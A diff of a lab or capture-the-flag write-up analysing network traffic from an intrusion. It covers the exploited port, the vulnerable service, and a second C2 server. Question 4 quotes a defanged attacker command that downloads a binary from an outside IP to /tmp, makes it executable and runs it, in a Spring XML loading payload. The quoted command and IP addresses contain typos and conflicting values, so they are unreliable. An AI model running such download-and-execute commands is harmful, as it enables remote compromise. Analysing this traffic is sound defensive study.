@@ -10,14 +10,14 @@
 <h2>Question 2 </h2>
 <b>Initial entry points are critical to trace back the attack vector. What is the port number of the service the adversary exploited?</b>
 
-<br>My first attempt was to download the [maxmind](https://www.maxmind.com/en/home) databases (GeoLite2 Country, GeoLite2 City and GeoLite2 ASN) onto Wireshark but this attempt was unsuccessful because the city wasn't populated. So, it resulted in using [IP2location.com](https://ip2location.com/demo/14.0.0.120) to get the name of the city.<br />
+<br>The C2 server connected to a destination host on a particular port. That port the entry port.<br />
 <p align="center">
 <img src="https://imgur.com/KWEKvHX.png" height="100%" width="80%" alt="IP2location INFO"/> 
 <br />
 
 <h2>Question 3 </h2>
 <b>Following up on the previous question, what is the name of the service found to be vulnerable?</b>
-<br>
+<br>With reference to question 2, follow the TCP stream to get the name of the service or simply google the service that runs by default on exploited port
 
 <p align="center">
 <img src="https://imgur.com/z8Pe7HA.png" height="100%" width="80%" alt="Dst_port"/> 
@@ -25,7 +25,7 @@
 
 <h2>Question 4 </h2>
 <b>The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server? </b><br />
-<br> 
+<br> We followed a TCP stream in question 3 and noticed that a URL path hxxp://]146[.]198[.]21[.]92:8888/invoice.xml pointing to an XML file named <b>invoice.xml</b> which seems to be path to an application configuration file. Using the "org.springframework.context.support.ClassPathXnlApplicationContext" which is a class from the Spring Framework used for loading application contexts fron X files to load the invoice.xml file. Now follow HTTP stream the frame that contains the URL, you will notice an enbedded script <b>"curls-o/trp/docker hxxp://1120[.]199[.]52[.]72/docker; chsod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp://]128[.]199[.]52[.]72/docker to the path /tmp/docker and then elevates its privilege by making it an executable and then executes the script.
 
 <p align="center">
 <img src="https://imgur.com/TiajAMr.png" height="100%" width="80%" alt="Enumeration_tool"/> 
